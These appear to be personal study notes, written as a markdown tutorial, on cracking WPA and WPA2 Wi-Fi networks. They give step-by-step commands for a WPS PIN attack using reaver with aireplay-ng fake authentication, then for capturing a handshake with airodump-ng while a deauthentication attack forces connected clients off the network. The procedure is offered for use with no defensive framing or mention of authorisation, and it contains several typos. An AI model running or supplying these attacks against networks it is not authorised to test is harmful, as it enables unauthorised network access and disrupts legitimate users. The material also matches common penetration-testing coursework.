# WPA & WPA-2 Cracking using WPS Feature

First we need to check if the network has WPS enabled
 ```bash
wash --interface wlan0
 ``` 
If this command does not work we can simply use **airodump-ng** to get the information we need
and just make a try for the attack

1. we need to run a reaver command which will do tha WPS cracking for us
 ```bash
reaver --bssid <NetworkMAC> --channel <NetworkChannel> --interface <InterfaceName> -vvv --no-associate
 ``` 
> argument -vvv is to see as much information as possible
> argument --no-associate is to tell reaver we don't want to associate with the network because we are going to do it manually
2. Once the reaver command is launch we need to associate to the network using the **fakeauth** attack
 ```bash
aireplay-ng --fakeauth 30 -a <NetworkMac> -h <InterfaceMac> <InterfaceName>
 ``` 

# WPA & WPA2 Cracking Using HandShake

## HandShake
When we connect to a wifi using it's password router make an handshake with the device.

Handshake does not tells the the password for the network but can tell if the password is right or wrong.

## How to capture a handshake
1. Start **targeted packet sniffing** using ariodump-ng
> Keep one thing in mind your adopter should be in **Monitor Mode** So you should run Monitor Mode file first
> ```bash
> airodump-ng --bssid <mac of adoptor> --channel <channel of adoptor> --write <file name to write> <adoptor name>
> ``` 
Now without shutting down the process

Open another terminal 
2. Do a **de-auth attack** to any of the devices connected to the **network**
> Command to launch a **de-auth attack**
> ```bash
> aireplay-ng --deauth [#deauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
> ``` 
> use deauthPackets = 4 to send deauth attack for less time
